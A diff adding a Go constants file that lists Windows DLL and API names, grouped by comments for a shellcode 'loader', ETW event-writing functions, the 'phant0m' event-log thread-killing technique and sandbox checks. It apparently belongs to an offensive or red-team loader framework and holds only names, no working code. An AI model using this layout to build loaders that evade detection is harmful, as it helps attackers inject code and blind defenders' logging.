@@ -1,0 +1,70 @@
+package wdll
+
+const (
+	// dll needs
+	kernel32DLL = "kernel32.dll"
+	ntdllDLL    = "ntdll.dll"
+	rpcrt4DLL   = "Rpcrt4.dll"
+	activedsDLL = "Activeds.dll"
+	psapiDLL    = "psapi.dll"
+	dbghelpDLL  = "dbghelp.dll"
+	advapi32DLL = "advapi32.dll"
+
+	// loader needs
+	virtualAlloc                = "VirtualAlloc"
+	virtualProtect              = "VirtualProtect"
+	rtlCopyMemory               = "RtlCopyMemory"
+	rtlCopyBytes                = "RtlCopyBytes"
+	convertThreadToFiber        = "ConvertThreadToFiber"
+	createFiber                 = "CreateFiber"
+	switchToFiber               = "SwitchToFiber"
+	getCurrentThread            = "GetCurrentThread"
+	ntQueueApcThreadEx          = "NtQueueApcThreadEx"
+	etwpCreateEtwThread         = "EtwpCreateEtwThread"
+	waitForSingleObject         = "WaitForSingleObject"
+	createThread                = "CreateThread"
+	openProcess                 = "OpenProcess"
+	virtualAllocEx              = "VirtualAllocEx"
+	virtualProtectEx            = "VirtualProtectEx"
+	writeProcessMemory          = "WriteProcessMemory"
+	createRemoteThreadEx        = "CreateRemoteThreadEx"
+	closeHandle                 = "CloseHandle"
+	heapCreate                  = "HeapCreate"
+	heapAlloc                   = "HeapAlloc"
+	enumSystemLocalesA          = "EnumSystemLocalesA"
+	uuidFromStringA             = "UuidFromStringA"
+	getCurrentProcess           = "GetCurrentProcess"
+	queueUserAPC                = "QueueUserAPC"
+	allocADsMem                 = "AllocADsMem"
+	enumSystemLocalesW          = "EnumSystemLocalesW"
+	rtlEthernetAddressToStringA = "RtlEthernetAddressToStringA"
+	rtlEthernetStringToAddressA = "RtlEthernetStringToAddressA"
+	rtlIpv4StringToAddressA     = "RtlIpv4StringToAddressA"
+	rtlIpv4AddressToStringA     = "RtlIpv4AddressToStringA"
+	rtlMoveMemory               = "RtlMoveMemory"
+	enumPageFilesW              = "EnumPageFilesW"
+	enumerateLoadedModules      = "EnumerateLoadedModules"
+	ntAllocateVirtualMemory     = "NtAllocateVirtualMemory"
+	ntWriteVirtualMemory        = "NtWriteVirtualMemory"
+	enumSystemLocalesEx         = "EnumSystemLocalesEx"
+
+	// etw
+	etwEventWrite         = "EtwEventWrite"
+	etwEventWriteEx       = "EtwEventWriteEx"
+	etwEventWriteFull     = "EtwEventWriteFull"
+	etwEventWriteString   = "EtwEventWriteString"
+	etwEventWriteTransfer = "EtwEventWriteTransfer"
+
+	// phant0m
+	ntQueryInformationThread = "NtQueryInformationThread"
+	i_QueryTagInformation    = "I_QueryTagInformation"
+	openThread               = "OpenThread"
+	terminateThread          = "TerminateThread"
+	readProcessMemory        = "ReadProcessMemory"
+	createToolhelp32Snapshot = "CreateToolhelp32Snapshot"
+	thread32First            = "Thread32First"
+
+	// sandbox needs
+	getTickCount                       = "GetTickCount"
+	getPhysicallyInstalledSystemMemory = "GetPhysicallyInstalledSystemMemory"
+)
